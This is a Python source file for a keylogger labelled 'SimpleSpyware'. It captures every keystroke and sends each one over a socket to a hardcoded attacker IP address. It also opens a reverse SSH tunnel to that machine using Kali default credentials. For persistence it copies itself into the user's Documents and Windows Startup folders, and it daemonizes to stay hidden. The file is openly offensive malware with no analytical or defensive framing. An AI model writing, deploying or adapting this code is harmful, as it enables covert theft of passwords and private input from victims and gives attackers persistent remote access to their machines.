import os
import shutil
import socket
import logging
import paramiko  # SSH library
import pyxhook  # For keylogging
import daemon   # For running in the background


class Keylogger:
    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    def start_logging(self):
        """ Start capturing key strokes. """
        hook_manager = pyxhook.HookManager()
        hook_manager.KeyDown = self._keydown_callback
        hook_manager.HookKeyboard()
        hook_manager.start()

    def _keydown_callback(self, key):
        """ Handle key stroke event. """
        try:
            logging.debug(chr(key.Ascii))  # Log the key stroke
            self.send_log(chr(key.Ascii))  # Send the log to the attacker
        except Exception as e:
            logging.error(f"Error in keydown callback: {e}")

    def send_log(self, log_data):
        """ Send log data to the attacker’s machine. """
        host = '192.168.26.129'  # Attacker's IP address
        port = 9999  # Port to send data through
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.sendall(log_data.encode('utf-8'))
            s.close()
        except Exception as e:
            logging.error(f"Error sending logs: {e}")

    def establish_reverse_ssh_tunnel(self):
        """ Establish reverse SSH tunnel to attacker’s machine. """
        attacker_ip = '192.168.26.129'  # Attacker's machine IP
        attacker_port = 9999  # Port on attacker’s machine to forward traffic to

        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically accept unknown host keys

        try:
            ssh_client.connect(attacker_ip, username='kali', password='kali')
            ssh_client.get_transport().request_port_forward('localhost', attacker_port)
            print("Reverse SSH tunnel established.")
        except Exception as e:
            logging.error(f"Failed to establish SSH tunnel: {e}")
        finally:
            ssh_client.close()


def copy_keylogger():
    """ Copy the keylogger script to a persistent location. """
    source_path = __file__  # The current script's path
    home_dir = os.getenv('USERPROFILE') or os.getenv('HOME')  # User's home directory
    target_dir = os.path.join(home_dir, "Documents")  # Default target directory

    if not os.path.exists(target_dir):
        target_dir = home_dir  # Fallback to home directory if Documents doesn't exist

    target_path = os.path.join(target_dir, "keylogger.py")  # Final target path

    try:
        shutil.copy(source_path, target_path)
        print(f"Keylogger copied to {target_path}")
    except Exception as e:
        logging.error(f"Failed to copy keylogger: {e}")

    # Optionally add the script to startup (Windows example)
    try:
        if os.name == 'nt':  # Windows
            startup_dir = os.path.join(os.getenv('APPDATA'), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            startup_script = os.path.join(startup_dir, "keylogger.pyw")  # Use .pyw for no console
            shutil.copy(target_path, startup_script)
            print(f"Keylogger added to startup: {startup_script}")
    except Exception as e:
        logging.error(f"Failed to add keylogger to startup: {e}")


if __name__ == '__main__':
    # Copy the keylogger to a persistent location
    copy_keylogger()

    # Set up logging
    logging.basicConfig(level=logging.DEBUG, filename='activity.log', format='Key: %(message)s')
    handler = logging.getLogger().handlers[0].stream

    # Daemonize the process to hide it
    with daemon.DaemonContext(files_preserve=[handler]):
        keylogger = Keylogger('SimpleSpyware')
        keylogger.start_logging()
        keylogger.establish_reverse_ssh_tunnel()  # Establish SSH tunnel
